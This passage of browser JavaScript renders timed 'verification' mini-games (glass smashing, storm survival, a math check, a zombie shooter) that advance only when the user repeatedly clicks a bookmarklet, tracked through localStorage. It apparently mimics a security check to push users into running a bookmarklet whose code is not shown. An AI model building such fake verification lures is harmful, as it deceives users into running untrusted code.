      eyeCol = C.eyeHappy;
      screenCol = "#22c55e";
      mouthOpen = 0.8;
      antennaWobble = Math.sin(t * 0.1) * 8;
    }

    ctx.save();
    ctx.translate(cx, baseY + bodyBob);
    ctx.rotate(bodyTilt);

    var by = -160;

    ctx.fillStyle = "rgba(0,0,0,0.3)";
    ctx.beginPath();
    ctx.ellipse(0, 72, 50, 10, 0, 0, Math.PI * 2);
    ctx.fill();

    [-1, 1].forEach(function (side) {
      var lx = side * 22;
      var ly = 10 + (side === -1 ? lLegOff : rLegOff);
      jumpCanvasRR(ctx, lx - 11, ly, 22, 55, 6, C.leg, "#1e40af");
      ctx.fillStyle = C.joint;
      ctx.beginPath();
      ctx.arc(lx, ly + 2, 6, 0, Math.PI * 2);
      ctx.fill();
      ctx.beginPath();
      ctx.arc(lx, ly + 55, 6, 0, Math.PI * 2);
      ctx.fill();
      jumpCanvasRR(ctx, lx - 14, ly + 55, 28, 14, 5, C.foot, "#1e40af");
    });

    jumpCanvasRR(ctx, -36, by + 60, 72, 90, 10, C.body, C.bodyLight);
    jumpCanvasRR(ctx, -28, by + 70, 56, 30, 6, C.panel, null);
    ctx.globalAlpha = 0.85;
    jumpCanvasRR(ctx, -22, by + 74, 44, 22, 4, screenCol, null);
    ctx.globalAlpha = 1;
    ctx.strokeStyle = "rgba(0,0,0,0.2)";
    ctx.lineWidth = 1;
    var i;
    for (i = 0; i < 4; i++) {
      ctx.beginPath();
      ctx.moveTo(-22, by + 78 + i * 5);
      ctx.lineTo(22, by + 78 + i * 5);
      ctx.stroke();
    }
    [-28, 22].forEach(function (bx) {
      ctx.fillStyle = C.bolt;
      ctx.beginPath();
      ctx.arc(bx, by + 120, 4, 0, Math.PI * 2);
      ctx.fill();
    });
    jumpCanvasRR(ctx, -20, by + 148, 40, 14, 4, C.joint, "#0f172a");

    [-1, 1].forEach(function (side) {
      var angle = side === -1 ? lArmA : rArmA;
      var foreAngle = side === -1 ? lForeA : rForeA;
      ctx.save();
      ctx.translate(side * 36, by + 70);
      ctx.rotate(angle * side);
      jumpCanvasRR(ctx, -7, 0, 14, 42, 6, C.arm, "#1e40af");
      ctx.fillStyle = C.joint;
      ctx.beginPath();
      ctx.arc(0, 0, 7, 0, Math.PI * 2);
      ctx.fill();
      ctx.beginPath();
      ctx.arc(0, 42, 6, 0, Math.PI * 2);
      ctx.fill();
      ctx.translate(0, 42);
      ctx.rotate(foreAngle * side);
      jumpCanvasRR(ctx, -6, 0, 12, 34, 5, C.arm, "#1e40af");
      jumpCanvasRR(ctx, -9, 32, 18, 14, 6, C.hand, "#1e40af");
      ctx.restore();
    });

    ctx.save();
    ctx.translate(0, headBob);
    jumpCanvasRR(ctx, -10, by + 52, 20, 12, 4, C.joint, "#0f172a");
    jumpCanvasRR(ctx, -38, by - 2, 76, 60, 12, C.head, C.headLight);
    [-1, 1].forEach(function (side) {
      jumpCanvasRR(ctx, side * 36 - 4, by + 10, 8, 20, 4, C.panel, C.headLight);
      ctx.fillStyle = C.antennaTop;
      ctx.beginPath();
      ctx.arc(side * 40, by + 20, 3, 0, Math.PI * 2);
      ctx.fill();
    });

    [-1, 1].forEach(function (side) {
      var ex = side * 16;
      var ey = by + 18;
      jumpCanvasRR(ctx, ex - 12, ey - 9, 24, 18, 5, "#0c1445", null);
      ctx.fillStyle = eyeCol;
      ctx.globalAlpha = 0.9;
      if (mood === "angry") {
        ctx.beginPath();
        ctx.moveTo(ex - 10, ey - 6);
        ctx.lineTo(ex + 10, ey - 2);
        ctx.lineTo(ex + 10, ey + 6);
        ctx.lineTo(ex - 10, ey + 6);
        ctx.closePath();
        ctx.fill();
      } else if (mood === "happy") {
        ctx.beginPath();
        ctx.arc(ex, ey + 2, 7, Math.PI, 0);
        ctx.fill();
      } else {
        ctx.beginPath();
        ctx.arc(ex, ey, 7, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = "rgba(255,255,255,0.5)";
        ctx.beginPath();
        ctx.arc(ex + 3, ey - 3, 2, 0, Math.PI * 2);
        ctx.fill();
      }
      ctx.globalAlpha = 1;
    });

    var my = by + 42;
    jumpCanvasRR(ctx, -16, my - 5, 32, 12, 4, "#0c1445", null);
    if (mouthOpen > 0) {
      ctx.globalAlpha = 0.85;
      var mw = 28 * mouthOpen;
      jumpCanvasRR(ctx, -mw / 2, my - 3, mw, 8, 3, eyeCol, null);
      ctx.globalAlpha = 1;
    }

    ctx.strokeStyle = C.antenna;
    ctx.lineWidth = 2.5;
    ctx.beginPath();
    ctx.moveTo(0, by - 2);
    ctx.lineTo(antennaWobble, by - 26);
    ctx.stroke();
    ctx.fillStyle = C.antennaTop;
    ctx.beginPath();
    ctx.arc(antennaWobble, by - 28, 5, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = "rgba(255,255,255,0.6)";
    ctx.beginPath();
    ctx.arc(antennaWobble + 1, by - 30, 2, 0, Math.PI * 2);
    ctx.fill();

    ctx.restore();
    ctx.restore();
  }

  function renderStep2Content(puzzle) {
    var body = getEl("challenge2Body");
    if (!body || !puzzle || !puzzle.step2) return;
    stopChallenge2Visuals();
    body.classList.remove("puzzle-body-tall", "puzzle-body-xl", "stage2-dark-scene", "step2-glass-scene", "step2-jump", "step2-quiz-scene");
    var s = puzzle.step2;
    var type = s.type;
    var limit = s.timeLimit || 30;
    var timerBlock =
      '<div class="step2-pressure-timer" id="step2PressureTimer" role="status" aria-live="polite">' +
      '<div class="step2-timer-row">' +
      '<span class="step2-timer-label">Time left</span>' +
      '<span class="step2-timer-digits"><span id="step2TimerValue">0</span><span class="step2-timer-s">s</span></span>' +
      "</div>" +
      '<div class="step2-timer-track"><div class="step2-timer-fill" id="step2TimerFill"></div></div>' +
      "</div>";

    if (type === "glass") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl", "step2-glass-scene");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        "<div class=\"puzzle-glass-wrap\">" +
        "<div class=\"puzzle-glass-scene\" id=\"glassScene\">" +
        "<div class=\"glass-shards\" id=\"glassShards\" aria-hidden=\"true\">" +
        "<span class=\"glass-shard\"></span><span class=\"glass-shard\"></span><span class=\"glass-shard\"></span><span class=\"glass-shard\"></span>" +
        "<span class=\"glass-shard\"></span><span class=\"glass-shard\"></span><span class=\"glass-shard\"></span><span class=\"glass-shard\"></span>" +
        "</div>" +
        "<div class=\"puzzle-glass-pane\" id=\"glassPane\">" +
        "<div class=\"glass-shine\"></div>" +
        "<div class=\"glass-crack-layer\" id=\"glassCrackA\"></div>" +
        "<div class=\"glass-crack-layer c2\" id=\"glassCrackB\"></div>" +
        "<div class=\"glass-crack-layer c3\" id=\"glassCrackC\"></div>" +
        "</div></div></div>" +
        "<div class=\"puzzle-progress-wrap glass-progress\">" +
        "<div class=\"puzzle-progress-label\"><span class=\"glass-lbl-muted\">Destroyed:</span> <strong id=\"glassPctNum\">0</strong><span class=\"glass-lbl-muted\">%</span></div>" +
        "<div class=\"puzzle-progress-track\"><div class=\"puzzle-progress-fill\" id=\"glassPctFill\"></div></div>" +
        "</div>";

      var lastGlassN = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      function tickGlass() {
        var pane = getEl("glassPane");
        var scene = getEl("glassScene");
        var cc = getEl("clickCounter");
        var pctEl = getEl("glassPctNum");
        var fill = getEl("glassPctFill");
        if (!pane || !currentPuzzle || currentPuzzle.step2.type !== "glass") return;
        var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
        if (cc) cc.textContent = String(n);
        var delta = getStep2SpamClicks();
        var destroyedPct = Math.min(99, Math.floor(delta * GLASS_PCT_PER_CLICK));
        if (pctEl) pctEl.textContent = String(destroyedPct);
        if (fill) fill.style.width = destroyedPct + "%";
        var ratio = destroyedPct / 100;
        var a = getEl("glassCrackA");
        var b = getEl("glassCrackB");
        var c = getEl("glassCrackC");
        if (a) a.style.opacity = ratio > 0.08 ? String(Math.min(1, (ratio - 0.08) / 0.35)) : "0";
        if (b) b.style.opacity = ratio > 0.35 ? String(Math.min(1, (ratio - 0.35) / 0.32)) : "0";
        if (c) c.style.opacity = ratio > 0.62 ? String(Math.min(1, (ratio - 0.62) / 0.38)) : "0";
        if (n > lastGlassN) {
          pane.classList.remove("hammer-hit");
          void pane.offsetWidth;
          pane.classList.add("hammer-hit");
        }
        lastGlassN = n;
        if (destroyedPct >= 99) {
          pane.classList.add("shattered");
          if (scene) scene.classList.add("glass-destroyed");
        }
      }
      tickGlass();
      window._glassVisualInterval = setInterval(tickGlass, 100);
      startStep2PressureTimer(limit);
      return;
    }
    if (type === "storm") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl", "stage2-dark-scene");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        "<div class=\"puzzle-storm-v2\" id=\"stormBox\">" +
        "<div class=\"storm-fog\"></div>" +
        "<div class=\"storm-vignette\" id=\"stormVignette\"></div>" +
        "<div class=\"storm-clouds\"></div>" +
        "<div class=\"storm-rain-v2\" id=\"stormRain\"></div>" +
        "<div class=\"storm-robot-panel\">" +
        "<span class=\"storm-status-tag\">Heavy rain</span>" +
        "<svg class=\"storm-hero-human\" xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 120 168\" aria-hidden=\"true\">" +
        "<path fill=\"#1e293b\" d=\"M60 4c14 0 26 10 28 24 1 9-2 18-9 24 2 4 3 9 2 14H39c-1-5 0-10 2-14-7-6-10-15-9-24C34 14 46 4 60 4z\"/>" +
        "<ellipse cx=\"60\" cy=\"34\" rx=\"17\" ry=\"19\" fill=\"#fdbcb4\"/>" +
        "<ellipse cx=\"51\" cy=\"32\" rx=\"2.8\" ry=\"3.5\" fill=\"#0f172a\"/>" +
        "<ellipse cx=\"69\" cy=\"32\" rx=\"2.8\" ry=\"3.5\" fill=\"#0f172a\"/>" +
        "<path fill=\"none\" stroke=\"#be123c\" stroke-width=\"1.8\" stroke-linecap=\"round\" d=\"M48 44c8 5 16 5 24 0\"/>" +
        "<path fill=\"#ea580c\" d=\"M26 54c8-6 52-6 60 0l10 58H26l10-58z\"/>" +
        "<line x1=\"60\" y1=\"54\" x2=\"60\" y2=\"112\" stroke=\"#9a3412\" stroke-width=\"1.4\" opacity=\".4\"/>" +
        "<path fill=\"#ea580c\" d=\"M26 56L6 80l8 10 20-18 8-6zm68 0l20 24-8 10-20-18-8-6z\"/>" +
        "<circle cx=\"6\" cy=\"86\" r=\"7\" fill=\"#fdbcb4\"/>" +
        "<circle cx=\"114\" cy=\"86\" r=\"7\" fill=\"#fdbcb4\"/>" +
        "<rect x=\"40\" y=\"108\" width=\"14\" height=\"46\" rx=\"4\" fill=\"#1d4ed8\"/>" +
        "<rect x=\"66\" y=\"108\" width=\"14\" height=\"46\" rx=\"4\" fill=\"#1d4ed8\"/>" +
        "<ellipse cx=\"47\" cy=\"156\" rx=\"12\" ry=\"5\" fill=\"#334155\"/>" +
        "<ellipse cx=\"73\" cy=\"156\" rx=\"12\" ry=\"5\" fill=\"#334155\"/>" +
        "</svg>" +
        "</div>" +
        "<div class=\"puzzle-progress-wrap storm-health-wrap\">" +
        "<div class=\"puzzle-progress-label\"><span class=\"storm-health-title\">Survivor health</span><span class=\"storm-health-pct\" id=\"stormHealthPct\">100%</span></div>" +
        "<div class=\"puzzle-progress-track\"><div class=\"puzzle-progress-fill storm-health\" id=\"stormHealthFill\" style=\"width:100%\"></div></div>" +
        "</div>" +
        "</div>";

      var rain = getEl("stormRain");
      if (rain) {
        for (var ri = 0; ri < 96; ri++) {
          var drop = document.createElement("span");
          var cls = "rain-drop";
          if (Math.random() < 0.38) cls += " rain-wide";
          if (Math.random() < 0.28) cls += " rain-fast";
          drop.className = cls;
          drop.style.left = Math.random() * 100 + "%";
          drop.style.animationDuration = (0.32 + Math.random() * 0.58) + "s";
          drop.style.animationDelay = Math.random() * 2.2 + "s";
          rain.appendChild(drop);
        }
      }

      var robotHealth = 100;
      var lastStormClicks = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      window._stormStartedAt = Date.now();
      var stormLimitMs = limit * 1000;
      window._stormHealthInterval = setInterval(function () {
        if (!currentPuzzle || currentPuzzle.step2.type !== "storm") return;
        var elapsed = Date.now() - window._stormStartedAt;
        var nStorm = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
        if (nStorm > lastStormClicks) {
          robotHealth = Math.min(100, robotHealth + (nStorm - lastStormClicks) * 6);
          lastStormClicks = nStorm;
        }
        var drain = elapsed < stormLimitMs * 0.5 ? 3.4 : 10.2;
        robotHealth -= drain * 0.1;
        var hFill = getEl("stormHealthFill");
        var vig = getEl("stormVignette");
        var ccSt = getEl("clickCounter");
        if (ccSt) ccSt.textContent = String(nStorm);
        var hpPct = Math.max(0, Math.min(100, Math.round(robotHealth)));
        if (hFill) hFill.style.width = hpPct + "%";
        var pctLabel = getEl("stormHealthPct");
        if (pctLabel) {
          pctLabel.textContent = hpPct + "%";
          pctLabel.classList.toggle("storm-health-low", hpPct < 35);
        }
        if (vig) {
          if (robotHealth < 38) vig.classList.add("on");
          else vig.classList.remove("on");
        }
        if (robotHealth <= 0) {
          robotHealth = 0;
          if (window._stormHealthInterval) {
            clearInterval(window._stormHealthInterval);
            window._stormHealthInterval = null;
          }
        }
      }, 100);
      startStep2PressureTimer(limit);
      return;
    }
    if (type === "math") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl", "step2-quiz-scene");

      var a = Math.floor(Math.random() * 41) + 20;
      var b = Math.floor(Math.random() * 41) + 40;
      if (a + b < 61) b = 61 - a;

      body.innerHTML =
        '<span id="clickCounter" class="hidden-bookmark-sync" aria-hidden="true">0</span>' +
        timerBlock +
        '<div style="margin:14px 12px 0;border-radius:14px;border:1px solid #e2e8f0;background:#fff;overflow:hidden;box-shadow:0 4px 24px rgba(15,23,42,0.08);">' +

        '<div style="display:flex;align-items:center;gap:10px;padding:16px 18px 14px;">' +
        '<div style="flex-shrink:0;width:36px;height:36px;border-radius:8px;background:#fff7ed;border:1.5px solid #fdba74;display:flex;align-items:center;justify-content:center;font-size:18px;">🧮</div>' +
        '<div style="flex:1;">' +
        '<p style="margin:0;font-size:13px;font-weight:700;color:#ea580c;letter-spacing:0.04em;text-transform:uppercase;">Math Verification</p>' +
        '<p style="margin:3px 0 0;font-size:12px;color:#78716c;font-weight:400;line-height:1.4;">Use your bookmark to increase the number until you reach the correct answer.</p>' +
        '</div>' +
        '</div>' +

        '<div style="margin:0 16px 16px;padding:18px 20px;border-radius:10px;background:#f8fafc;border:1px solid #e2e8f0;">' +
        '<p style="margin:0 0 10px;font-size:17px;font-weight:700;color:#1e293b;font-family:\'SF Mono\',ui-monospace,SFMono-Regular,Menlo,monospace;text-align:center;letter-spacing:0.02em;">Solve: ' + a + ' + ' + b + '</p>' +
        '<p style="margin:0;font-size:16px;font-weight:600;color:#475569;font-family:\'SF Mono\',ui-monospace,SFMono-Regular,Menlo,monospace;text-align:center;">Clicks: <span id="cfMathClickCount" style="display:inline-block;min-width:24px;padding:2px 8px;border-radius:6px;background:#fff;border:1px solid #e2e8f0;color:#ea580c;font-weight:800;font-size:17px;">0</span></p>' +
        '</div>' +
        '</div>';

      var lastClicks = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      function tickMathClicks() {
        var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
        if (n !== lastClicks) {
          lastClicks = n;
          var countEl = getEl("cfMathClickCount");
          if (countEl) countEl.textContent = String(n);
        }
      }
      window._mathSuggestionInterval = setInterval(tickMathClicks, 120);

      startStep2PressureTimer(limit);
      return;
    }
    if (type === "zombies") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl", "stage2-dark-scene");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        "<div class=\"puzzle-zombies-v2 puzzle-zombies-canvas-gw\" id=\"zombiesCanvasGw\">" +
        "<div class=\"zombies-canvas-overlay\">" +
        "<canvas class=\"zombies-canvas-el\" id=\"zombiesCv\" width=\"640\" height=\"300\" role=\"img\" aria-label=\"Zombie survival\"></canvas>" +
        "<div class=\"zombies-canvas-msg\" id=\"zombiesCvMsg\" aria-live=\"polite\"></div>" +
        "</div></div>";

      if (!CanvasRenderingContext2D.prototype.roundRect) {
        CanvasRenderingContext2D.prototype.roundRect = function (x, y, w, h, r) {
          r = Math.min(r, w / 2, h / 2);
          this.beginPath();
          this.moveTo(x + r, y);
          this.arcTo(x + w, y, x + w, y + h, r);
          this.arcTo(x + w, y + h, x, y + h, r);
          this.arcTo(x, y + h, x, y, r);
          this.arcTo(x, y, x + w, y, r);
          this.closePath();
          return this;
        };
      }

      var cv = getEl("zombiesCv");
      if (!cv || !cv.getContext) {
        startStep2PressureTimer(limit);
        return;
      }
      var ctx = cv.getContext("2d");
      var W = 640;
      var H = 300;
      cv.width = W;
      cv.height = H;
      var LINE_X = 155;
      var HUMAN_X = LINE_X - 10;
      var HUMAN_Y = H / 2;
      var zcSurviveMs = Math.min(Math.max((limit || 30) * 450, 11000), 24000);
      var zcList = [];
      var particles = [];
      var splats = [];
      var shots = [];
      var kills = 0;
      var zcWave = 1;
      var gameState = "playing";
      var startTime = 0;
      var lastTime = 0;
      var zcSpawnsPerSecond = 20;
      var spawnInterval = 1000 / zcSpawnsPerSecond;
      var spawnTimer = 0;
      var aimAngle = 0;
      var humanShootTimer = 0;
      var lastZ = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);

      function zcRand(a, b) {
        return a + Math.random() * (b - a);
      }

      function zcMakeZombie() {
        var spd = zcRand(0.42, 0.88) + zcWave * 0.1;
        return {
          x: W + 20,
          y: zcRand(26, H - 26),
          vx: -spd,
          vy: zcRand(-0.055, 0.055),
          r: zcRand(12, 16),
          wobble: zcRand(0, Math.PI * 2),
          wobbleSpeed: zcRand(0.04, 0.09),
          flash: 0,
          dying: false,
          dyingTimer: 0
        };
      }

      function zcKillZombie(z) {
        z.dying = true;
        z.dyingTimer = 18;
        zcEmit(z.x, z.y, "#4ade80", 10);
        zcEmit(z.x, z.y, "#86efac", 6);
        splats.push({ x: z.x, y: z.y, r: z.r * 1.2, life: 260 });
        kills++;
        var ks = getEl("zombiesKillsStat");
        if (ks) ks.textContent = "Kills: " + kills;
      }

      function zcEmit(x, y, color, n) {
        var i;
        for (i = 0; i < n; i++) {
          var a = zcRand(0, Math.PI * 2);
          var s = zcRand(1.5, 4.5);
          particles.push({ x: x, y: y, vx: Math.cos(a) * s, vy: Math.sin(a) * s, life: 22, color: color });
        }
      }

      function zcShootFromBookmark(burst) {
        var ki;
        for (ki = 0; ki < burst; ki++) {
          var alive = zcList.filter(function (z) {
            return !z.dying;
          });
          if (!alive.length) return;
          alive.sort(function (a, b) {
            return a.x - b.x;
          });
          var target = alive[0];
          aimAngle = Math.atan2(target.y - HUMAN_Y, target.x - HUMAN_X);
          humanShootTimer = 12;
          shots.push({ x: HUMAN_X + 14, y: HUMAN_Y - 6, tx: target.x, ty: target.y, life: 10 });
          zcKillZombie(target);
        }
      }

      function zcDrawBg() {
        ctx.fillStyle = "#1a2540";
        ctx.fillRect(0, 0, W, H);
        ctx.fillStyle = "#162035";
        var i;
        for (i = 0; i < 10; i++) ctx.fillRect(0, i * 38, W, 19);
        var s;
        for (s = 0; s < splats.length; s++) {
          var sp = splats[s];
          ctx.globalAlpha = 0.65 * (sp.life / 260);
          ctx.fillStyle = "#166534";
          ctx.beginPath();
          ctx.arc(sp.x, sp.y, sp.r, 0, Math.PI * 2);
          ctx.fill();
          ctx.globalAlpha = 1;
        }
        ctx.fillStyle = "rgba(239,68,68,0.08)";
        ctx.fillRect(0, 0, LINE_X, H);
        ctx.strokeStyle = "#dc2626";
        ctx.lineWidth = 3;
        ctx.setLineDash([10, 6]);
        ctx.beginPath();
        ctx.moveTo(LINE_X, 0);
        ctx.lineTo(LINE_X, H);
        ctx.stroke();
        ctx.setLineDash([]);
        ctx.fillStyle = "#ef4444";
        ctx.font = "10px ui-monospace,monospace";
        ctx.fillText("LINE", LINE_X - 38, H / 2 - 5);
      }

      function zcDrawHuman() {
        ctx.save();
        ctx.translate(HUMAN_X, HUMAN_Y);
        var shooting = humanShootTimer > 6;
        ctx.fillStyle = "#1e3a8a";
        ctx.beginPath();
        ctx.arc(0, -26, 9, Math.PI, 0);
        ctx.closePath();
        ctx.fill();
        ctx.fillStyle = "#fbbf24";
        ctx.beginPath();
        ctx.arc(0, -22, 7, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = "#1e293b";
        ctx.beginPath();
        ctx.arc(3, -23, 2, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = "#2563eb";
        ctx.beginPath();
        ctx.roundRect(-8, -15, 16, 20, 3);
        ctx.fill();
        ctx.strokeStyle = "#1d4ed8";
        ctx.lineWidth = 1;
        ctx.strokeRect(-8, -15, 16, 20);
        ctx.strokeStyle = "#64748b";
        ctx.lineWidth = 3;
        ctx.beginPath();
        ctx.moveTo(-3, 5);
        ctx.lineTo(-4, 22);
        ctx.stroke();
        ctx.beginPath();
        ctx.moveTo(3, 5);
        ctx.lineTo(4, 22);
        ctx.stroke();
        ctx.save();
        ctx.rotate(shooting ? aimAngle - 0.15 : aimAngle);
        ctx.strokeStyle = "#2563eb";
        ctx.lineWidth = 3;
        ctx.beginPath();
        ctx.moveTo(-8, -12);
        ctx.lineTo(-14, 4);
        ctx.stroke();
        ctx.beginPath();
        ctx.moveTo(8, -12);
        ctx.lineTo(6, 0);
        ctx.stroke();
        ctx.fillStyle = "#475569";
        ctx.beginPath();
        ctx.roundRect(6, -6, 22, 5, 2);
        ctx.fill();
        ctx.fillStyle = "#334155";
        ctx.beginPath();
        ctx.roundRect(6, -6, 10, 5, 1);
        ctx.fill();
        if (shooting) {
          ctx.fillStyle = "#fde047";
          ctx.beginPath();
          ctx.moveTo(28, -3);
          ctx.lineTo(35, -7);
          ctx.lineTo(33, -1);
          ctx.lineTo(38, -4);
          ctx.lineTo(30, 2);
          ctx.closePath();
          ctx.fill();
        }
        ctx.restore();
        ctx.restore();
      }

      function zcDrawZombie(z) {
        ctx.save();
        var wobY = Math.sin(z.wobble) * 3;
        if (z.dying) {
          ctx.globalAlpha = z.dyingTimer / 18;
          ctx.translate(z.x, z.y + wobY);
          ctx.rotate((1 - z.dyingTimer / 18) * 1.5);
        } else {
          ctx.translate(z.x, z.y + wobY);
        }
        var col = z.flash > 0 ? "#ffffff" : "#65a30d";
        var skin = z.flash > 0 ? "#fff" : "#a3e635";
        ctx.fillStyle = "#1a2e05";
        ctx.beginPath();
        ctx.arc(0, -z.r * 0.3, z.r * 0.48, Math.PI, 0);
        ctx.closePath();
        ctx.fill();
        ctx.fillStyle = skin;
        ctx.beginPath();
        ctx.arc(0, -z.r * 0.28, z.r * 0.43, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = col;
        ctx.beginPath();
        ctx.roundRect(-z.r * 0.44, -z.r * 0.05, z.r * 0.88, z.r * 0.94, 3);
        ctx.fill();
        ctx.strokeStyle = col;
        ctx.lineWidth = 2.5;
        ctx.beginPath();
        ctx.moveTo(-z.r * 0.44, z.r * 0.1);
        ctx.lineTo(-z.r * 0.9, z.r * 0.55 + Math.sin(z.wobble * 1.4) * 5);
        ctx.moveTo(z.r * 0.44, z.r * 0.1);
        ctx.lineTo(z.r * 0.95, z.r * 0.38 + Math.sin(z.wobble) * 5);
        ctx.moveTo(-z.r * 0.22, z.r * 0.89);
        ctx.lineTo(-z.r * 0.3, z.r * 1.38);
        ctx.moveTo(z.r * 0.22, z.r * 0.89);
        ctx.lineTo(z.r * 0.3, z.r * 1.38);
        ctx.stroke();
        ctx.fillStyle = "#dc2626";
        ctx.beginPath();
        ctx.arc(-z.r * 0.16, -z.r * 0.33, 3, 0, Math.PI * 2);
        ctx.fill();
        ctx.beginPath();
        ctx.arc(z.r * 0.16, -z.r * 0.33, 3, 0, Math.PI * 2);
        ctx.fill();
        ctx.restore();
      }

      function zcDrawShots() {
        var si;
        for (si = 0; si < shots.length; si++) {
          var s = shots[si];
          var t = s.life / 10;
          ctx.save();
          ctx.globalAlpha = t;
          ctx.strokeStyle = "#fde047";
          ctx.lineWidth = 2;
          ctx.setLineDash([6, 4]);
          ctx.beginPath();
          ctx.moveTo(s.x, s.y);
          ctx.lineTo(s.tx, s.ty);
          ctx.stroke();
          ctx.setLineDash([]);
          ctx.restore();
        }
      }

      function zcLoop(ts) {
        if (!currentPuzzle || currentPuzzle.step2.type !== "zombies" || !getEl("zombiesCv")) {
          window._zombiesCanvasRaf = null;
          return;
        }

        if (gameState !== "playing") {
          zcDrawBg();
          zcDrawHuman();
          window._zombiesCanvasRaf = requestAnimationFrame(zcLoop);
          return;
        }

        if (!lastTime) lastTime = ts;
        var dt = Math.min(ts - lastTime, 80);
        lastTime = ts;
        var elapsed = ts - startTime;
        var remaining = Math.max(0, zcSurviveMs - elapsed);
        var pct = remaining / zcSurviveMs;
        var tsEl = getEl("zombiesTimeStat");
        if (tsEl) tsEl.textContent = (remaining / 1000).toFixed(1) + "s";
        var bar = getEl("zombiesSurviveBar");
        if (bar) {
          bar.style.width = pct * 100 + "%";
          bar.style.background =
            pct > 0.4
              ? "linear-gradient(90deg,#15803d,#22c55e,#4ade80)"
              : pct > 0.2
                ? "linear-gradient(90deg,#c2410c,#f97316,#fbbf24)"
                : "linear-gradient(90deg,#991b1b,#ef4444,#fca5a5)";
        }

        if (remaining <= 0) {
          zcWave = Math.min(zcWave + 1, 12);
          startTime = ts;
          var wv = getEl("zombiesWaveStat");
          if (wv) wv.textContent = "Wave " + zcWave;
        }

        spawnTimer += dt;
        while (spawnTimer >= spawnInterval) {
          spawnTimer -= spawnInterval;
          zcList.push(zcMakeZombie());
        }
        if (humanShootTimer > 0) humanShootTimer--;

        var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
        var cc = getEl("clickCounter");
        if (cc) cc.textContent = String(n);
        if (n > lastZ) {
          if (window._zombiesIdleTimeout) {
            clearTimeout(window._zombiesIdleTimeout);
            window._zombiesIdleTimeout = null;
          }
          var delta = n - lastZ;
          lastZ = n;
          zcShootFromBookmark(delta);
        }

        var zi;
        for (zi = 0; zi < zcList.length; zi++) {
          var z = zcList[zi];
          if (!z.dying) {
            z.x += z.vx;
            z.y += z.vy;
            z.wobble += z.wobbleSpeed;
            if (z.flash > 0) z.flash--;
            if (z.y < 20) z.vy = Math.abs(z.vy);
            if (z.y > H - 20) z.vy = -Math.abs(z.vy);
            if (z.x - z.r < LINE_X) {
              if (window._zombiesCanvasRaf) {
                cancelAnimationFrame(window._zombiesCanvasRaf);
                window._zombiesCanvasRaf = null;
              }
              gameState = "over";
              closeChallengeForRetry();
              return;
            }
          } else {
            z.dyingTimer--;
          }
        }

        zcList = zcList.filter(function (z) {
          return !z.dying || z.dyingTimer > 0;
        });
        splats = splats.filter(function (s) {
          s.life--;
          return s.life > 0;
        });
        particles = particles.filter(function (p) {
          p.x += p.vx;
          p.y += p.vy;
          p.life--;
          return p.life > 0;
        });
        shots = shots.filter(function (s) {
          s.life--;
          return s.life > 0;
        });

        while (
          zcList.filter(function (z) {
            return !z.dying;
          }).length > 55
        ) {
          var far = zcList
            .filter(function (z) {
              return !z.dying;
            })
            .sort(function (a, b) {
              return b.x - a.x;
            })[0];
          if (!far) break;
          far.dying = true;
          far.dyingTimer = 1;
        }

        zcDrawBg();
        zcDrawShots();
        var zj;
        for (zj = 0; zj < zcList.length; zj++) zcDrawZombie(zcList[zj]);
        zcDrawHuman();
        var pi;
        for (pi = 0; pi < particles.length; pi++) {
          var p = particles[pi];
          ctx.globalAlpha = p.life / 22;
          ctx.fillStyle = p.color;
          ctx.beginPath();
          ctx.arc(p.x, p.y, 3, 0, Math.PI * 2);
          ctx.fill();
          ctx.globalAlpha = 1;
        }

        window._zombiesCanvasRaf = requestAnimationFrame(zcLoop);
      }

      window._zombiesIdleTimeout = setTimeout(function () {
        if (!currentPuzzle || currentPuzzle.step2.type !== "zombies") return;
        if (getStep2SpamClicks() >= 1) return;
        closeChallengeForRetry();
      }, ZOMBIE_NO_BOOKMARK_IDLE_MS);

      gameState = "playing";
      zcList = [];
      particles = [];
      splats = [];
      shots = [];
      kills = 0;
      zcWave = 1;
      spawnTimer = 0;
      spawnInterval = 1000 / zcSpawnsPerSecond;
      aimAngle = 0;
      humanShootTimer = 0;
      lastTime = 0;
      startTime = performance.now();
      var wv0 = getEl("zombiesWaveStat");
      if (wv0) wv0.textContent = "Wave 1";
      var ks0 = getEl("zombiesKillsStat");
      if (ks0) ks0.textContent = "Kills: 0";
      var bar0 = getEl("zombiesSurviveBar");
      if (bar0) bar0.style.width = "100%";
      var msg0 = getEl("zombiesCvMsg");
      if (msg0) {
        msg0.classList.remove("show");
        msg0.innerHTML = "";
      }
      window._zombiesCanvasRaf = requestAnimationFrame(zcLoop);
      startStep2PressureTimer(limit);
      return;
    }
    if (type === "jump") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl", "step2-jump");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        // Full-width scene card — no horizontal margin, stretch edge-to-edge
        "<div style=\"width:100%;box-sizing:border-box;margin:8px 0 0;border-radius:0 0 0 0;overflow:hidden;border-top:1px solid #bae6fd;border-bottom:1px solid #bae6fd;box-shadow:none;\">" +

        // Sky scene — full width
